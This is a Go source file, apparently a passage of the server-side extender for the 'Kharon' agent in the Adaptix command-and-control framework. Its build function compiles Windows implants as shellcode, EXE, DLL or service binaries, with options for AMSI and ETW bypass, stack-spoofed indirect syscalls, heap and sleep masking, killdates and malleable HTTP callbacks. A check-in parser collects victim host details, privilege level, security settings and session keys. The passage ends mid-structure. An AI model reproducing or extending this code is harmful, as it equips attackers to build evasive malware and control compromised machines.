package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	mrand "math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"

	"time"

	"errors"
	"fmt"
	"math/rand"
	"strings"

	"github.com/google/uuid"

	ax "github.com/Adaptix-Framework/axc2"
)

func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {

	/// START CODE

	fmt.Printf("=== AgentGenerateProfile ===\n")
	fmt.Printf("agentConfig: %s\n", agentConfig)
	fmt.Printf("listenerWM: %s\n", listenerWM)

	// Print listenerMap detalhadamente
	fmt.Printf("listenerMap (%d items):\n", len(listenerMap))
	for key, value := range listenerMap {
		switch v := value.(type) {
		case string:
			fmt.Printf("  [%s] = %s\n", key, v)
		case int, int32, int64:
			fmt.Printf("  [%s] = %d\n", key, v)
		case bool:
			fmt.Printf("  [%s] = %t\n", key, v)
		case []byte:
			fmt.Printf("  [%s] = []byte (length: %d)\n", key, len(v))
		case map[string]any:
			fmt.Printf("  [%s] = map[string]any (%d items)\n", key, len(v))
		default:
			fmt.Printf("  [%s] = %v (type: %T)\n", key, v, v)
		}
	}
	fmt.Printf("============================\n")

	/// END CODE
	return nil, nil
}

func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	fmt.Println("=== AgentGenerateBuild START ===")
	fmt.Printf("DEBUG: agentConfig length: %d bytes\n", len(agentConfig))
	fmt.Printf("DEBUG: agentProfile length: %d bytes\n", len(agentProfile))
	fmt.Printf("DEBUG: listenerMap keys: %v\n", get_map_keys(listenerMap))

	var cfg AgentConfig
	if err := json.Unmarshal([]byte(agentConfig), &cfg); err != nil {
		fmt.Printf("ERROR: Failed to parse agentConfig: %v\n", err)
		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
	}

	decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
	if err != nil {
		fmt.Printf("ERROR: failed decode base64: %v\n", err)
		return nil, "", err
	}
	malleable_str := string(decoded)
	fmt.Printf("DEBUG: Malleable profile decoded (%d bytes)\n", len(malleable_str))

	// Build malleable HTTP bytes
	malleableBytes, callbackCount, err := BuildMalleableHTTPBytes(malleable_str)
	if err != nil {
		fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
		return nil, "", err
	}
	fmt.Printf("DEBUG: Malleable bytes generated (%d bytes)\n", len(malleableBytes))
	fmt.Printf("DEBUG: HTTP Callback count: %d\n", callbackCount)

	// Get working directory
	wd, err := os.Getwd()
	if err != nil {
		fmt.Printf("ERROR: Failed to get working directory: %v\n", err)
		panic(err)
	}
	fmt.Printf("DEBUG: Working directory: %s\n", wd)

	targetPath := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_beacon")
	fmt.Printf("DEBUG: Target path: %s\n", targetPath)

	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		fmt.Printf("ERROR: Target path does not exist: %s\n", targetPath)
		return nil, "", fmt.Errorf("target path not found: %s", targetPath)
	}

	// SSL configuration
	sslEnabled := false
	if s, ok := listenerMap["ssl"].(bool); ok {
		sslEnabled = s
		fmt.Printf("DEBUG: SSL from bool: %v\n", sslEnabled)
	} else if s2, ok := listenerMap["ssl"].(string); ok {
		sslEnabled = (s2 == "1" || strings.EqualFold(s2, "true"))
		fmt.Printf("DEBUG: SSL from string %q: %v\n", s2, sslEnabled)
	} else {
		fmt.Printf("DEBUG: SSL field not found or unknown type: %T\n", listenerMap["ssl"])
	}

	// Proxy configuration
	proxyURL := fmt.Sprint(listenerMap["proxy_url"])
	if proxyURL == "<nil>" {
		proxyURL = ""
	}
	proxyURL = strings.ReplaceAll(proxyURL, `\`, `\\`)
	proxyURL = strings.ReplaceAll(proxyURL, `"`, `\"`)

	proxyEnabled := false
	if strings.TrimSpace(proxyURL) != "" {
		proxyEnabled = true
		fmt.Printf("DEBUG: Proxy enabled with URL: %s\n", proxyURL)
	} else {
		fmt.Println("DEBUG: Proxy disabled")
	}

	proxyUser := fmt.Sprint(listenerMap["proxy_user"])
	if proxyUser == "<nil>" {
		proxyUser = ""
	}
	proxyUser = strings.ReplaceAll(proxyUser, `\`, `\\`)
	proxyUser = strings.ReplaceAll(proxyUser, `"`, `\"`)

	proxyPass := fmt.Sprint(listenerMap["proxy_pass"])
	if proxyPass == "<nil>" {
		proxyPass = ""
	}
	proxyPass = strings.ReplaceAll(proxyPass, `\`, `\\`)
	proxyPass = strings.ReplaceAll(proxyPass, `"`, `\"`)

	// Parse killdate
	killdateDay := 0
	killdateMonth := 0
	killdateYear := 0
	if cfg.KilldateCheck && cfg.KilldateDate != "" {
		fmt.Printf("DEBUG: Parsing killdate: %s\n", cfg.KilldateDate)
		parts := strings.Split(cfg.KilldateDate, ".")
		if len(parts) == 3 {
			if d, err := strconv.Atoi(parts[0]); err == nil {
				killdateDay = d
			} else {
				fmt.Printf("WARNING: Failed to parse killdate day: %v\n", err)
			}
			if m, err := strconv.Atoi(parts[1]); err == nil {
				killdateMonth = m
			} else {
				fmt.Printf("WARNING: Failed to parse killdate month: %v\n", err)
			}
			if y, err := strconv.Atoi(parts[2]); err == nil {
				killdateYear = y
			} else {
				fmt.Printf("WARNING: Failed to parse killdate year: %v\n", err)
			}
			fmt.Printf("DEBUG: Killdate parsed: %02d.%02d.%04d\n", killdateDay, killdateMonth, killdateYear)
		} else {
			fmt.Printf("WARNING: Invalid killdate format (expected DD.MM.YYYY): %s\n", cfg.KilldateDate)
		}
	}

	// Parse working time
	workStartHour := 0
	workStartMin := 0
	workEndHour := 0
	workEndMin := 0
	if cfg.WorkingTimeCheck {
		fmt.Println("DEBUG: Parsing working time...")
		if cfg.WorkingTimeStart != "" {
			parts := strings.Split(cfg.WorkingTimeStart, ":")
			if len(parts) == 2 {
				if h, err := strconv.Atoi(parts[0]); err == nil {
					workStartHour = h
				} else {
					fmt.Printf("WARNING: Failed to parse work start hour: %v\n", err)
				}
				if m, err := strconv.Atoi(parts[1]); err == nil {
					workStartMin = m
				} else {
					fmt.Printf("WARNING: Failed to parse work start minute: %v\n", err)
				}
				fmt.Printf("DEBUG: Work start time: %02d:%02d\n", workStartHour, workStartMin)
			} else {
				fmt.Printf("WARNING: Invalid work start time format: %s\n", cfg.WorkingTimeStart)
			}
		}
		if cfg.WorkingTimeEnd != "" {
			parts := strings.Split(cfg.WorkingTimeEnd, ":")
			if len(parts) == 2 {
				if h, err := strconv.Atoi(parts[0]); err == nil {
					workEndHour = h
				} else {
					fmt.Printf("WARNING: Failed to parse work end hour: %v\n", err)
				}
				if m, err := strconv.Atoi(parts[1]); err == nil {
					workEndMin = m
				} else {
					fmt.Printf("WARNING: Failed to parse work end minute: %v\n", err)
				}
				fmt.Printf("DEBUG: Work end time: %02d:%02d\n", workEndHour, workEndMin)
			} else {
				fmt.Printf("WARNING: Invalid work end time format: %s\n", cfg.WorkingTimeEnd)
			}
		}
	}

	// Parse sleep time
	khSleep := cfg.Sleep
	if khSleep == "" {
		khSleep = "3"
		fmt.Println("DEBUG: Using default sleep time: 3s")
	} else {
		khSleep = strings.TrimSuffix(khSleep, "s")
		fmt.Printf("DEBUG: Sleep time: %s\n", khSleep)
	}

	// Escape and format ForkPipe
	forkPipe := cfg.ForkPipe
	forkPipe = strings.ReplaceAll(forkPipe, `\`, `\\`)
	forkPipe = strings.ReplaceAll(forkPipe, `"`, `\"`)
	forkPipeC := fmt.Sprintf("L\\\"%s\\\"", forkPipe)

	// Escape and format Spawnto
	spawnto := cfg.Spawnto
	spawnto = strings.ReplaceAll(spawnto, `\`, `\\`)
	spawnto = strings.ReplaceAll(spawnto, `"`, `\"`)

	fmt.Printf("DEBUG: Spawnto (for make): %s\n", spawnto)

	// Build make variables
	makeVars := []string{
		fmt.Sprintf("WEB_SECURE_ENABLED=%d", bool_to_int(sslEnabled)),
		fmt.Sprintf("WEB_PROXY_ENABLED=%d", bool_to_int(proxyEnabled)),
		fmt.Sprintf("WEB_PROXY_URL=%s", proxyURL),
		fmt.Sprintf("WEB_PROXY_USERNAME=%s", proxyUser),
		fmt.Sprintf("WEB_PROXY_PASSWORD=%s", proxyPass),

		fmt.Sprintf("KH_SLEEP_TIME=%s", khSleep),
		fmt.Sprintf("KH_JITTER=%d", cfg.Jitter),
		fmt.Sprintf("KH_AGENT_UUID=%s", uuid.New()),

		fmt.Sprintf("KH_WORKTIME_ENABLED=%d", bool_to_int(cfg.WorkingTimeCheck)),
		fmt.Sprintf("KH_WORKTIME_START_HOUR=%d", workStartHour),
		fmt.Sprintf("KH_WORKTIME_START_MIN=%d", workStartMin),
		fmt.Sprintf("KH_WORKTIME_END_HOUR=%d", workEndHour),
		fmt.Sprintf("KH_WORKTIME_END_MIN=%d", workEndMin),

		fmt.Sprintf("KH_KILLDATE_ENABLED=%d", bool_to_int(cfg.KilldateCheck)),
		fmt.Sprintf("KH_KILLDATE_DAY=%d", killdateDay),
		fmt.Sprintf("KH_KILLDATE_MONTH=%d", killdateMonth),
		fmt.Sprintf("KH_KILLDATE_YEAR=%d", killdateYear),

		fmt.Sprintf("KH_FORK_PIPENAME=%s", forkPipeC),
		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),

		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", bool_to_int(cfg.BofApiProxy)),

		// Malleable HTTP bytes como array C entre aspas
		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytes_to_hexstr(malleableBytes)),
		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
	}

	// Guardrails
	if cfg.GuardUserName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_USER=%s", cfg.GuardUserName))
		fmt.Printf("DEBUG: Guardrail - Username: %s\n", cfg.GuardUserName)
	}
	if cfg.GuardDomainName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_DOMAIN=%s", cfg.GuardDomainName))
		fmt.Printf("DEBUG: Guardrail - Domain: %s\n", cfg.GuardDomainName)
	}
	if cfg.GuardHostName != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_HOST=%s", cfg.GuardHostName))
		fmt.Printf("DEBUG: Guardrail - Hostname: %s\n", cfg.GuardHostName)
	}
	if cfg.GuardIpAddress != "" {
		makeVars = append(makeVars, fmt.Sprintf("KH_GUARDRAILS_IPADDRESS=%s", cfg.GuardIpAddress))
		fmt.Printf("DEBUG: Guardrail - IP Address: %s\n", cfg.GuardIpAddress)
	}

	// Syscall flags
	fmt.Printf("DEBUG: Syscall method: %s\n", cfg.Syscall)
	switch cfg.Syscall {
	case "Stack Spoof + Indirect":
		makeVars = append(makeVars, "KH_SYSCALL=2")
	case "Stack Spoof":
		makeVars = append(makeVars, "KH_SYSCALL=1")
	default:
		makeVars = append(makeVars, "KH_SYSCALL=0")
	}

	// AMSI + ETW bypass
	fmt.Printf("DEBUG: Bypass method: %s\n", cfg.Bypass)
	switch cfg.Bypass {
	case "AMSI":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x700")
	case "ETW":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x400")
	case "AMSI + ETW":
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x100")
	default:
		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x000")
	}

	// Heap obfuscation
	fmt.Printf("DEBUG: Mask heap: %v\n", cfg.MaskHeap)
	if cfg.MaskHeap {
		makeVars = append(makeVars, "KH_HEAP_MASK=1")
	} else {
		makeVars = append(makeVars, "KH_HEAP_MASK=0")
	}

	// Sleep mask
	fmt.Printf("DEBUG: Sleep mask: %s\n", cfg.MaskSleep)
	switch strings.ToLower(cfg.MaskSleep) {
	case "timer":
		makeVars = append(makeVars, "KH_SLEEP_MASK=1")
	case "pooling":
		makeVars = append(makeVars, "KH_SLEEP_MASK=2")
	default:
		makeVars = append(makeVars, "KH_SLEEP_MASK=3")
	}

	// Determine build target
	debugMode := cfg.Debug
	target := "x64"
	if strings.EqualFold(cfg.Format, "x86") {
		target = "x86"
	}
	if debugMode {
		target = target + "-debug"
	}

	fmt.Printf("DEBUG: Build target: %s\n", target)

	fmt.Println("\n→ Make variables:")
	for _, v := range makeVars {
		fmt.Println("   ", v)
	}

	// Execute make command
	allArgs := append([]string{"-C", targetPath, target}, makeVars...)
	cmd := exec.Command("make", allArgs...)

	fmt.Printf("\nDEBUG: Running command: make %v\n", allArgs)

	var stdOut, stdErr bytes.Buffer
	cmd.Stdout = &stdOut
	cmd.Stderr = &stdErr

	fmt.Println("DEBUG: Executing make command...")
	if err := cmd.Run(); err != nil {
		fmt.Printf("ERROR: Make command failed: %v\n", err)
		fmt.Printf("STDOUT:\n%s\n", stdOut.String())
		fmt.Printf("STDERR:\n%s\n", stdErr.String())
		return nil, "", fmt.Errorf("make failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
	}
	fmt.Println("DEBUG: Make command completed successfully")

	// Read compiled beacon
	outputFile := filepath.Join(targetPath, "Bin", fmt.Sprintf("Kharon.%s.bin", target))
	fmt.Printf("DEBUG: Reading output file: %s\n", outputFile)

	bin, err := os.ReadFile(outputFile)
	if err != nil {
		fmt.Printf("ERROR: Failed to read output file %s: %v\n", outputFile, err)
		return nil, "", fmt.Errorf("failed to read output (%s): %v", outputFile, err)
	}
	fmt.Printf("DEBUG: Read %d bytes from output file\n", len(bin))

	outFileName := ""
	var finalBin []byte

	fmt.Printf("\nDEBUG: Processing format: %s\n", cfg.Format)

	// Compile loader if needed
	if cfg.Format == "Exe" || cfg.Format == "Dll" || cfg.Format == "Svc" {
		fmt.Println("→ Compiling loader for format:", cfg.Format)

		loaderPath := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_loader")
		fmt.Printf("DEBUG: Loader path: %s\n", loaderPath)

		if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
			fmt.Printf("ERROR: Loader path does not exist: %s\n", loaderPath)
			return nil, "", fmt.Errorf("loader path not found: %s", loaderPath)
		}

		// Generate shellcode header
		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
		fmt.Printf("DEBUG: Generating shellcode header at: %s\n", shellcodeHeaderPath)

		shellcodeContent := gen_shelllcode_header(bin)
		fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))

		if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
			fmt.Printf("ERROR: Failed to write Shellcode.h: %v\n", err)
			return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
		}
		fmt.Println("→ Shellcode injected into:", shellcodeHeaderPath)

		var sourceFile string
		var outputName string

		switch cfg.Format {
		case "Exe":
			sourceFile = "Exe.cc"
			outputName = "Kharon.x64.exe"
		case "Dll":
			sourceFile = "Dll.cc"
			outputName = "Kharon.x64.dll"
		case "Svc":
			sourceFile = "Svc.cc"
			outputName = "Kharon.x64.svc.exe"
		}

		fmt.Printf("DEBUG: Source file: %s, Output name: %s\n", sourceFile, outputName)

		sourcePath := filepath.Join(loaderPath, "Source", "Main", sourceFile)
		outputPath := filepath.Join(loaderPath, "Bin", outputName)

		if _, err := os.Stat(sourcePath); os.IsNotExist(err) {
			fmt.Printf("ERROR: Source file does not exist: %s\n", sourcePath)
			return nil, "", fmt.Errorf("source file not found: %s", sourcePath)
		}

		binDir := filepath.Join(loaderPath, "Bin")
		if err := os.MkdirAll(binDir, 0755); err != nil {
			fmt.Printf("ERROR: Failed to create Bin directory: %v\n", err)
			return nil, "", fmt.Errorf("failed to create Bin directory: %v", err)
		}
		fmt.Printf("DEBUG: Created/verified Bin directory: %s\n", binDir)

		includeDir := filepath.Join(loaderPath, "Include")

		clangArgs := []string{
			"-target", "x86_64-w64-mingw32",
			"-I", includeDir,
			"-o", outputPath,
			sourcePath,
			"-Os",
			"-mwindows",
			"-nostdlib",
			"-s",
			"-lkernel32",
			"-ladvapi32",
		}

		if cfg.Format == "Dll" {
			clangArgs = append(clangArgs, "-shared")
			fmt.Println("DEBUG: Added -shared flag for DLL compilation")
		}

		fmt.Printf("→ Running clang++: %v\n", clangArgs)

		clangCmd := exec.Command("clang++", clangArgs...)
		clangCmd.Stdout = &stdOut
		clangCmd.Stderr = &stdErr

		fmt.Println("DEBUG: Executing clang++ command...")
		if err := clangCmd.Run(); err != nil {
			fmt.Printf("ERROR: clang++ command failed: %v\n", err)
			fmt.Printf("STDOUT:\n%s\n", stdOut.String())
			fmt.Printf("STDERR:\n%s\n", stdErr.String())
			return nil, "", fmt.Errorf("clang++ failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
		}
		fmt.Println("DEBUG: clang++ command completed successfully")

		finalBin, err = os.ReadFile(outputPath)
		if err != nil {
			fmt.Printf("ERROR: Failed to read loader output %s: %v\n", outputPath, err)
			return nil, "", fmt.Errorf("failed to read loader output (%s): %v", outputPath, err)
		}
		fmt.Printf("DEBUG: Read %d bytes from loader output\n", len(finalBin))

		outFileName = outputName
		fmt.Println("→ Loader compiled successfully:", outputPath)
	}

	// Set output filename and final binary
	switch cfg.Format {
	case "Exe":
		outFileName = "Kharon.x64.exe"
	case "Dll":
		outFileName = "Kharon.x64.dll"
	case "Svc":
		outFileName = "Kharon.x64.svc.exe"
	case "Bin":
		outFileName = "Kharon.x64.bin"
		finalBin = bin
		fmt.Println("DEBUG: Using raw binary format")
	default:
		outFileName = fmt.Sprintf("Kharon.%s.bin", target)
		finalBin = bin
		fmt.Printf("DEBUG: Using default format with target: %s\n", target)
	}

	fmt.Println("\n✓ Build completed successfully!")
	fmt.Printf("  Output file: %s\n", outFileName)
	fmt.Printf("  Final size: %d bytes\n", len(finalBin))
	fmt.Println("=== AgentGenerateBuild END ===\n")

	return finalBin, outFileName, nil
}

func GetWindowsVersionName(major uint32, minor uint32, build uint32) string {
    if major == 10 && minor == 0 {
        if build >= 22000 {
            return "Windows 11"
        }
        return "Windows 10"
    }

    // Windows 8.1
    if major == 6 && minor == 3 {
        return "Windows 8.1"
    }

    // Windows 8
    if major == 6 && minor == 2 {
        return "Windows 8"
    }

    // Windows 7
    if major == 6 && minor == 1 {
        return "Windows 7"
    }

    // Windows Vista
    if major == 6 && minor == 0 {
        return "Windows Vista"
    }

    return fmt.Sprintf("Windows %d.%d (Build %d)", major, minor, build)
}

func GetDetailedWindowsVersion(major uint32, minor uint32, build uint32) map[string]interface{} {
    versionInfo := map[string]interface{}{
        "version_number": fmt.Sprintf("%d.%d", major, minor),
        "build":          build,
        "name":           "",
        "release_name":   "",
    }

    if major == 10 && minor == 0 {
        versionInfo["name"] = "Windows 10/11"

        if build >= 22000 {
            versionInfo["name"] = "Windows 11"
            switch {
            case build >= 22621:
                versionInfo["release_name"] = "23H2"
            case build >= 22000:
                versionInfo["release_name"] = "21H2"
            }
        } else {
            versionInfo["name"] = "Windows 10"
            switch {
            case build >= 19045:
                versionInfo["release_name"] = "22H2"
            case build >= 19044:
                versionInfo["release_name"] = "22H2"
            case build >= 19043:
                versionInfo["release_name"] = "21H2"
            case build >= 19041:
                versionInfo["release_name"] = "21H1"
            }
        }
    } else if major == 6 && minor == 3 {
        versionInfo["name"] = "Windows 8.1"
        versionInfo["release_name"] = "8.1"
    } else if major == 6 && minor == 2 {
        versionInfo["name"] = "Windows 8"
        versionInfo["release_name"] = "8"
    } else if major == 6 && minor == 1 {
        versionInfo["name"] = "Windows 7"
        versionInfo["release_name"] = "7"
    } else if major == 6 && minor == 0 {
        versionInfo["name"] = "Windows Vista"
        versionInfo["release_name"] = "Vista"
    }

    return versionInfo
}

func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
	var (
		agent ax.AgentData
		khcfg KharonData
	)

	fmt.Println("=== DEBUG RAW DATA ===")
	fmt.Printf("Total bytes received: %d\n", len(initialData))
	fmt.Printf("Hex dump:\n%s", hex.Dump(initialData))
	fmt.Printf("\n")
	fmt.Println("======================")

	packer := CreatePacker(initialData)

	command := packer.ParseInt8()
	fmt.Printf("Command: 0x%x\n", command)
	if command != 0xf1 {
		return agent, ModuleObject.ext, errors.New("error agent checkin data")
	}

	khcfg.session.agent_id_str = string(packer.ParsePad(36))
	agentId := fmt.Sprintf("%08x", rand.Uint32())
	fmt.Printf("Agent ID: %s\n", agentId)
	fmt.Printf("Agent Random UUID: %s\n", khcfg.session.agent_id_str)

	khcfg.session.agent_id_str = agentId

	// Machine info
	khcfg.machine.os_arch = packer.ParseInt8()
	fmt.Printf("OS Arch: %v\n", khcfg.machine.os_arch)

	khcfg.machine.username = string(packer.ParseBytes())
	fmt.Printf("Username: %v\n", khcfg.machine.username)

	khcfg.machine.computer = packer.ParseString()
	fmt.Printf("Computer: %s\n", khcfg.machine.computer)

	khcfg.machine.domain = packer.ParseString()
	fmt.Printf("Domain: %s\n", khcfg.machine.domain)

	khcfg.machine.netbios = packer.ParseString()
	fmt.Printf("NETBIOS: %s\n", khcfg.machine.netbios)

	khcfg.session.process_id = uint32(packer.ParseInt32())
	fmt.Printf("PID: %v\n", khcfg.session.process_id)

	khcfg.session.img_path = packer.ParseString()
	fmt.Printf("Image Path: %s\n", khcfg.session.img_path)

	// Custom agent storage for kharon config
	khcfg.session.acp = uint32(packer.ParseInt32())
	fmt.Printf("ACP: %v\n", khcfg.session.acp)

	khcfg.session.oemcp = uint32(packer.ParseInt32())
	fmt.Printf("OEMCP: %v\n", khcfg.session.oemcp)

	// Evasion features
	khcfg.evasion.syscall = uint32(packer.ParseInt32())
	fmt.Printf("Syscall: %v\n", khcfg.evasion.syscall)

	khcfg.evasion.bof_proxy = packer.ParseInt32() != 0
	fmt.Printf("BOF Proxy: %v\n", khcfg.evasion.bof_proxy)

	khcfg.evasion.amsi_etw_bypass = int32(packer.ParseInt32())
	fmt.Printf("AMSI/ETW Bypass: %v\n", khcfg.evasion.amsi_etw_bypass)

	// Killdate informations
	khcfg.killdate.enabled = packer.ParseInt32() != 0
	fmt.Printf("Killdate Enabled: %v\n", khcfg.killdate.enabled)

	khcfg.killdate.exit = packer.ParseInt32() != 0
	fmt.Printf("Killdate Exit: %v\n", khcfg.killdate.exit)

	khcfg.killdate.selfdel = packer.ParseInt32() != 0
	fmt.Printf("Killdate SelfDelete: %v\n", khcfg.killdate.selfdel)

	year := int(packer.ParseInt16())
	month := int(packer.ParseInt16())
	day := int(packer.ParseInt16())

	fmt.Printf("Killdate - Year: %d, Month: %d, Day: %d\n", year, month, day)

	if year < 1 || year > 9999 {
		year = 2025
	}
	if month < 1 || month > 12 {
		month = 1
	}
	if day < 1 || day > 31 {
		day = 1
	}

	khcfg.killdate.date = time.Date(year, time.Month(month), day, 0, 0, 0, 0, time.UTC)
	fmt.Printf("Killdate Date: %s\n", khcfg.killdate.date.Format("02/01/2006"))

	// Worktime informations
	khcfg.worktime.enabled = packer.ParseInt32() != 0
	fmt.Printf("Worktime Enabled: %v\n", khcfg.worktime.enabled)

	startHour := packer.ParseInt16()
	startMin := packer.ParseInt16()
	endHour := packer.ParseInt16()
	endMin := packer.ParseInt16()

	khcfg.worktime.start = fmt.Sprintf("%02d:%02d", startHour, startMin)
	khcfg.worktime.end = fmt.Sprintf("%02d:%02d", endHour, endMin)
	fmt.Printf("Worktime: %s - %s\n", khcfg.worktime.start, khcfg.worktime.end)

	// Guardrail informations
	khcfg.guardrails.ipaddress = packer.ParseString()
	fmt.Printf("Guard IP: %s\n", khcfg.guardrails.ipaddress)

	khcfg.guardrails.hostname = packer.ParseString()
	fmt.Printf("Guard Hostname: %s\n", khcfg.guardrails.hostname)

	khcfg.guardrails.username = packer.ParseString()
	fmt.Printf("Guard Username: %s\n", khcfg.guardrails.username)

	khcfg.guardrails.domain = packer.ParseString()
	fmt.Printf("Guard Domain: %s\n", khcfg.guardrails.domain)

	// Additional session informations
	khcfg.session.cmd_line = packer.ParseString()
	fmt.Printf("CommandLine: %v\n", khcfg.session.cmd_line)

	khcfg.session.heap_handle = uint64(packer.ParseInt64())
	fmt.Printf("Heap Handle: 0x%X\n", khcfg.session.heap_handle)

	khcfg.session.elevated = packer.ParseInt32() != 0
	fmt.Printf("Elevated: %v\n", khcfg.session.elevated)

	khcfg.session.jitter = uint32(packer.ParseInt32())
	fmt.Printf("Jitter: %v\n", khcfg.session.jitter)

	khcfg.session.sleep_time = uint32(packer.ParseInt32())
	fmt.Printf("Sleep(ms): %v\n", khcfg.session.sleep_time)

	khcfg.session.parent_id = uint32(packer.ParseInt32())
	fmt.Printf("ParentID: %v\n", khcfg.session.parent_id)

	khcfg.session.process_arch = uint32(packer.ParseInt32())
	fmt.Printf("Process Arch: %v\n", khcfg.session.process_arch)

	khcfg.session.base.start = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
	fmt.Printf("Kharon Memory Start: %v\n", khcfg.session.base.start)

	khcfg.session.base.size = uint32(packer.ParseInt32())
	fmt.Printf("Kharon Memory Length: %v\n", khcfg.session.base.size)

	startAddr, _ := strconv.ParseUint(strings.TrimPrefix(khcfg.session.base.start, "0x"), 16, 64)
	khcfg.session.base.end = fmt.Sprintf("%#x", startAddr+uint64(khcfg.session.base.size))
	fmt.Printf("Kharon Memory End: %s\n", khcfg.session.base.end)

	khcfg.session.thread_id = uint32(packer.ParseInt32())
	fmt.Printf("TID: %v\n", khcfg.session.thread_id)

	// Fork informations
	khcfg.ps.spawnto = string(packer.ParseBytes())
	fmt.Printf("Spawnto: %v\n", khcfg.ps.spawnto)

	khcfg.ps.fork_pipe = string(packer.ParseBytes())
	fmt.Printf("ForkPipeName: %v\n", khcfg.ps.fork_pipe)

	// Mask informations 
	khcfg.mask.jmpgadget = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
	fmt.Printf("JmpGadget: %v\n", khcfg.mask.jmpgadget)

	khcfg.mask.heap = packer.ParseInt32() != 0
	fmt.Printf("Mask Heap: %v\n", khcfg.mask.heap)

	khcfg.mask.ntcontinue = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
	fmt.Printf("NtContinue: %v\n", khcfg.mask.ntcontinue)

	khcfg.mask.beacon = uint32(packer.ParseInt32())
	fmt.Printf("Mask Beacon: %v\n", khcfg.mask.beacon)

	// Additional machine informations
	khcfg.machine.processor_name = string(packer.ParseBytes())
	fmt.Printf("Processor Name: %v\n", khcfg.machine.processor_name)

	khcfg.machine.ipaddress = int32_to_ipv4(packer.ParseInt32())
	fmt.Printf("IP Address: %s\n", khcfg.machine.ipaddress)

	khcfg.machine.ram_total = uint32(packer.ParseInt32())
	fmt.Printf("Total RAM: %v MB\n", khcfg.machine.ram_total)

	khcfg.machine.ram_aval = uint32(packer.ParseInt32())
	fmt.Printf("Available RAM: %v MB\n", khcfg.machine.ram_aval)

	khcfg.machine.ram_used = uint32(packer.ParseInt32())
	fmt.Printf("Used RAM: %v MB\n", khcfg.machine.ram_used)

	khcfg.machine.ram_perct = uint32(packer.ParseInt32())
	fmt.Printf("Percent RAM: %v%%\n", khcfg.machine.ram_perct)

	khcfg.machine.processor_numbers = uint32(packer.ParseInt32())
	fmt.Printf("Processors Nbr: %v\n", khcfg.machine.processor_numbers)

	// Win version
	khcfg.machine.os_major = uint32(packer.ParseInt32())
	fmt.Printf("OS Major: %v\n", khcfg.machine.os_major)

	khcfg.machine.os_minor = uint32(packer.ParseInt32())
	fmt.Printf("OS Minor: %v\n", khcfg.machine.os_minor)

	khcfg.machine.os_build = uint32(packer.ParseInt32())
	fmt.Printf("OS Build: %v\n", khcfg.machine.os_build)

	// Memory info
	khcfg.machine.allocation_gran = uint32(packer.ParseInt32())
	fmt.Printf("Allocation Granularity: %v\n", khcfg.machine.allocation_gran)

	khcfg.machine.page_size = uint32(packer.ParseInt32())
	fmt.Printf("Page Size: %v\n", khcfg.machine.page_size)

	// Security informations
	khcfg.machine.cfg_enabled = packer.ParseInt32() != 0
	fmt.Printf("CFG Enabled: %v\n", khcfg.machine.cfg_enabled)

	khcfg.machine.vbs_hvci = uint32(packer.ParseInt32())
	fmt.Printf("VBS/HVCI Status: %v\n", khcfg.machine.vbs_hvci)

	khcfg.machine.dse_status = uint32(packer.ParseInt32())
	fmt.Printf("DSE Status: %v\n", khcfg.machine.dse_status)

	khcfg.machine.testsign_enabled = packer.ParseInt32() != 0
	fmt.Printf("Test Signing Enabled: %v\n", khcfg.machine.testsign_enabled)

	khcfg.machine.debugmode_enabled = packer.ParseInt32() != 0
	fmt.Printf("Debug Mode Enabled: %v\n", khcfg.machine.debugmode_enabled)

	khcfg.machine.secureboot_enabled = packer.ParseInt32() != 0
	fmt.Printf("Secure Boot Enabled: %v\n", khcfg.machine.secureboot_enabled)

	// Encryption key
	key := packer.ParseBytes()
	fmt.Printf("Session Key: %v\n", key)

	// Process image name
	process := ConvertCpToUTF8(khcfg.session.img_path, int(khcfg.session.acp))
	if strings.Contains(process, "\\") {
		parts := strings.Split(process, "\\")
		process = parts[len(parts)-1]
	}

	khcfg.session.img_name = process

	versionInfo := GetDetailedWindowsVersion(khcfg.machine.os_major, khcfg.machine.os_minor, khcfg.machine.os_build)
	osDesc := fmt.Sprintf("%s (%s)", versionInfo["name"], versionInfo["release_name"])

	agent = ax.AgentData{
		Id:         agentId,
		SessionKey: key,
		OemCP:      int(khcfg.session.oemcp),
		ACP:        int(khcfg.session.acp),
		Sleep:      uint(khcfg.session.sleep_time / 1000),
		Jitter:     uint(khcfg.session.jitter),
		Username:   ConvertCpToUTF8(khcfg.machine.username, int(khcfg.session.acp)),
		Computer:   ConvertCpToUTF8(khcfg.machine.computer, int(khcfg.session.acp)),
		Process:    process,
